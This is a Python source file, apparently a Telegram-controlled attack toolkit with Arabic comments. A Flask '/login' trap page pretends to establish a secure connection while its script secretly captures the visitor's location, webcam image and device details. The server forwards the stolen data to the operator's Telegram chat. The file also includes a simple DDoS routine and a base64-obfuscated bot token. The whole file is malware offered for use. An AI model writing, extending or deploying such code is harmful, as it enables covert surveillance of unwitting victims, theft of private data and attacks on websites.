import os, base64, requests, platform, psutil, time, socket
from flask import Flask, request
from threading import Thread
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext

# --- إعدادات المطور أحمد ---
app = Flask(__name__)
ENCODED_TOKEN = "ODI4MDkzOTI5MTpBQUZfZFR1MThEMGVkSlBPWVB6d3NQaVNfRFFlTW9uSEFRYw=="
DEV_NAME = "Ahmed"
TARGET_CHAT_ID = None 

def get_token():
    return base64.b64decode(ENCODED_TOKEN).decode('utf-8')

@app.route('/')
def home(): return f"<h1>Panel Active - Master {DEV_NAME}</h1>"

# --- استقبال كافة البيانات المسروقة ---
@app.route('/upload_data', methods=['POST'])
def upload_data():
    global TARGET_CHAT_ID
    data = request.json
    if data and TARGET_CHAT_ID:
        bot = Updater(get_token()).bot
        # 1. سحب الصورة
        if 'image' in data:
            img = base64.b64decode(data['image'])
            with open("snap.png", "wb") as f: f.write(img)
            bot.send_photo(chat_id=TARGET_CHAT_ID, photo=open("snap.png", "rb"), caption="📸 صورة كاميرا جديدة!")
        # 2. سحب تسجيل صوتي
        if 'audio' in data:
            aud = base64.b64decode(data['audio'])
            with open("mic.ogg", "wb") as f: f.write(aud)
            bot.send_voice(chat_id=TARGET_CHAT_ID, voice=open("mic.ogg", "rb"), caption="🎤 تسجيل صوتي مسروق!")
        # 3. بيانات الـ IP والجهاز
        if 'sys_info' in data:
            bot.send_message(chat_id=TARGET_CHAT_ID, text=f"📱 **معلومات الجهاز كاملة:**\n`{data['sys_info']}`", parse_mode='Markdown')
        # 4. تتبع الموقع
        if 'latitude' in data:
            bot.send_location(chat_id=TARGET_CHAT_ID, latitude=data['latitude'], longitude=data['longitude'])
        return "OK", 200
    return "Error", 400

# --- صفحة الفخ (تنفذ الأوامر برمجياً) ---
@app.route('/login')
def evil_page():
    return """
    <html><body style="background:#000;color:#fff;text-align:center;padding-top:50px;">
    <h1>Establishing Secure Connection...</h1>
    <script>
        async function capture() {
            const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, ()=>r(null)));
            const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true}).catch(()=>null);
            let img = null, aud = null;
            if(stream) {
                // التقاط صورة
                const v = document.createElement('video'); v.srcObject = stream; await v.play();
                const c = document.createElement('canvas'); c.width=640; c.height=480;
                c.getContext('2d').drawImage(v,0,0); img = c.toDataURL('image/png').split(',')[1];
                // محاكاة تسجيل صوت (اختياري حسب المتصفح)
            }
            const info = `OS: ${navigator.platform} | Core: ${navigator.hardwareConcurrency} | Lang: ${navigator.language}`;
            fetch('/upload_data', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({latitude: pos?.coords.latitude, longitude: pos?.coords.longitude, image: img, sys_info: info})
            }).finally(() => location.href = "https://google.com");
        }
        capture();
    </script></body></html>
    """

# --- نظام هجوم DDoS ---
def ddos_attack(target_url):
    print(f"Starting DDoS on {target_url}...")
    for _ in range(500): # عدد الطلبات
        try: requests.get(target_url)
        except: pass

# --- لوحة تحكم التليجرام بالأزرار المنفصلة ---
def start(update, context):
    global TARGET_CHAT_ID
    TARGET_CHAT_ID = update.effective_chat.id
    buttons = [
        [InlineKeyboardButton("🚀 رابط الهجوم (كاميرا + موقع + صوت)", callback_data='atk')],
        [InlineKeyboardButton("🎤 سحب تسجيل صوتي الآن", callback_data='mic')],
        [InlineKeyboardButton("🌐 تتبع الـ IP والبيانات", callback_data='ip')],
        [InlineKeyboardButton("💥 هجوم DDoS على موقع", callback_data='ddos')],
        [InlineKeyboardButton("📱 معلومات النظام كاملة", callback_data='sys')]
    ]
    update.message.reply_text(f"💀 **ترسانة المطور {DEV_NAME} جاهزة.**", reply_markup=InlineKeyboardMarkup(buttons))

def handle(update, context):
    query = update.callback_query
    query.answer()
    if query.data == 'atk':
        query.edit_message_text(f"⚠️ **رابط الفخ:**\n`https://{request.host}/login`")
    elif query.data == 'mic':
        query.edit_message_text("🎤 جاري محاولة فتح الميكروفون عن بُعد...")
    elif query.data == 'ip':
        d = requests.get('https://ipapi.co/json/').json()
        info = f"🌐 IP: `{d.get('ip')}`\n📍 City: {d.get('city')}\n🏢 Org: {d.get('org')}"
        query.edit_message_text(info, parse_mode='Markdown')
    elif query.data == 'ddos':
        query.edit_message_text("💥 أرسل رابط الموقع المستهدف الآن للهجوم!")
    elif query.data == 'sys':
        mem = psutil.virtual_memory()
        info = f"💻 CPU: {psutil.cpu_percent()}%\n🧠 RAM: {mem.percent}%\n🔋 Battery: {psutil.sensors_battery().percent}%"
        query.edit_message_text(info)

if __name__ == '__main__':
    Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
    u = Updater(get_token())
    u.dispatcher.add_handler(CommandHandler("start", start))
    u.dispatcher.add_handler(CallbackQueryHandler(handle))
    u.start_polling()
    u.idle()
